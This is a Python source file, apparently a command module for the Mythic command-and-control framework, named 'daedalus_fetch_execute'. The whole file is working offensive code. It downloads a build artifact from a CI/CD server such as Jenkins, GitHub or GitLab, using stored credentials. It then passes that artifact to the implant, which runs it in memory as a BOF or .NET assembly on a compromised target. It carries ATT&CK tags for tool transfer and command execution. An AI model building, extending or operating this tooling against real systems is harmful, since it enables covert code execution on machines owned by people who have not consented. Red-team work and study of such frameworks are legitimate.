from __future__ import annotations

import json
import logging
import os

from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterGroupInfo,
    ParameterType,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
    TaskArguments,
)
from mythic_container.MythicGoRPC import (
    SendMythicRPCCallbackSearch,
    SendMythicRPCFileCreate,
    SendMythicRPCResponseCreate,
    MythicRPCCallbackSearchMessage,
    MythicRPCFileCreateMessage,
    MythicRPCResponseCreateMessage,
)

from daedalus.providers import get_provider
from daedalus_ca.secrets import resolve_provider_kwargs
from daedalus_ca.shared import load_agent_support, select_artifact, provider_credential_parameters

logger = logging.getLogger("daedalus_ca.fetch_execute")


class FetchExecuteArguments(TaskArguments):
    def __init__(self, command_line: str, task_id: int = 0, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="job",
                type=ParameterType.String,
                description="Job/workflow name (e.g. loader-c-mingw, build.yml)",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=1),
                ],
            ),
            CommandParameter(
                name="tool_type",
                type=ParameterType.ChooseOne,
                description="Type of tool to execute in-memory",
                choices=["bof", "assembly"],
                default_value="bof",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=2),
                ],
            ),
            CommandParameter(
                name="provider",
                type=ParameterType.ChooseOneCustom,
                description="CI/CD provider (credentials resolved from Mythic Secrets)",
                choices=["jenkins", "github", "gitlab", "forgejo", "gitea"],
                default_value="jenkins",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=3),
                ],
            ),
            CommandParameter(
                name="build_id",
                type=ParameterType.String,
                description="Build number or run ID (e.g. lastSuccessfulBuild, latest)",
                default_value="lastSuccessfulBuild",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=4),
                ],
            ),
            CommandParameter(
                name="artifact_name",
                type=ParameterType.String,
                description="Specific artifact filename (auto-selects binary if empty)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=5),
                ],
            ),
            CommandParameter(
                name="bof_args",
                type=ParameterType.String,
                description="Arguments to pass to the BOF (packed format)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=6),
                ],
            ),
            CommandParameter(
                name="assembly_args",
                type=ParameterType.String,
                description="Arguments to pass to the .NET assembly (space-separated)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=7),
                ],
            ),
            *provider_credential_parameters(),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)

    async def parse_dictionary(self, dictionary: dict):
        self.load_args_from_dictionary(dictionary)


class FetchExecute(CommandBase):
    cmd = "daedalus_fetch_execute"
    description = (
        "Fetch a CI/CD artifact and execute it in-memory on the target callback. "
        "Supports BOFs and .NET assemblies. Credentials are resolved from Mythic "
        "Secrets automatically - only fill in provider overrides if needed."
    )
    help_cmd = "daedalus_fetch_execute -job loader-c-mingw -tool_type bof"
    author = "@Lavender-exe"
    version = 3
    script_only = True
    argument_class = FetchExecuteArguments
    attackmapping = ["T1105", "T1059"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        builtin=True,
        suggested_command=True,
        load_only=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        try:
            provider_name = (taskData.args.get_arg("provider") or os.getenv("DAEDALUS_PROVIDER", "jenkins")).lower()
            job = taskData.args.get_arg("job")
            build_id = taskData.args.get_arg("build_id") or "lastSuccessfulBuild"
            artifact_name = taskData.args.get_arg("artifact_name") or ""
            tool_type = taskData.args.get_arg("tool_type") or "bof"
            bof_args = taskData.args.get_arg("bof_args") or ""
            assembly_args = taskData.args.get_arg("assembly_args") or ""

            if not job:
                raise ValueError("job is required")

            kwargs = resolve_provider_kwargs(taskData, provider_name)
            provider = get_provider(provider_name, **kwargs)

            if not artifact_name:
                artifacts = await provider.list_artifacts(job, build_id)
                selected = select_artifact(artifacts)
                if not selected:
                    raise ValueError(f"No artifacts found for {job} #{build_id}")
                artifact_name = selected["relativePath"]

            if not artifact_name:
                artifact_name = job

            logger.warning("Downloading %s/%s #%s/%s via %s", provider_name, job, build_id, artifact_name, provider_name)
            artifact_bytes = await provider.download_artifact(job, build_id, artifact_name)
            logger.warning("Downloaded %s (%d bytes)", artifact_name, len(artifact_bytes))

            file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=artifact_bytes,
                Filename=os.path.basename(artifact_name),
                DeleteAfterFetch=True,
                Comment=f"Daedalus CA: fetched from {provider_name}/{job} #{build_id}",
            ))
            if not file_resp.Success:
                raise RuntimeError(f"File upload failed: {file_resp.Error}")

            agent_file_id = file_resp.AgentFileId
            logger.warning("Uploaded to Mythic: %s", agent_file_id)

            support = load_agent_support()
            callback_resp = await SendMythicRPCCallbackSearch(MythicRPCCallbackSearchMessage(
                CallbackID=taskData.Task.CallbackID,
            ))

            target_payload_type = taskData.PayloadType
            if not target_payload_type and callback_resp.Success and callback_resp.Results:
                target_payload_type = getattr(callback_resp.Results[0], "PayloadType", "") or ""

            agent_cfg = support.get(target_payload_type, {})

            if tool_type == "bof":
                native_cmd = agent_cfg.get("bof_command", "execute_coff")
                file_param = agent_cfg.get("bof_file_parameter_name", "bof_file")
                params = {file_param: agent_file_id}
                if bof_args:
                    arg_param = agent_cfg.get("bof_argument_array_parameter_name", "arguments")
                    params[arg_param] = bof_args
            elif tool_type == "assembly":
                default_method = agent_cfg.get("assembly_default_execution_method", "execute_assembly")
                native_cmd = agent_cfg.get(f"{default_method}_command", "execute_assembly")
                file_param = agent_cfg.get(f"{default_method}_file_parameter_name", "assembly_file")
                params = {file_param: agent_file_id}
                if assembly_args:
                    arg_param = agent_cfg.get(f"{default_method}_argument_parameter_name", "assembly_arguments")
                    params[arg_param] = assembly_args
            else:
                raise ValueError(f"Unknown tool_type: {tool_type}")

            response.DisplayParams = f"[{tool_type}] {artifact_name} from {provider_name}/{job} #{build_id}"
            response.CommandName = native_cmd
            response.ReprocessAtNewCommandPayloadType = target_payload_type
            response.Params = json.dumps(params)

            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=(
                    f"Fetched {artifact_name} ({len(artifact_bytes)} bytes) from {provider_name}/{job} #{build_id}\n"
                    f"Delegating to {target_payload_type}/{native_cmd}"
                ).encode(),
            ))

        except Exception as e:
            logger.error("fetch_execute failed: %s", e, exc_info=True)
            response.Success = False
            response.Error = str(e)
            response.Completed = True

        return response
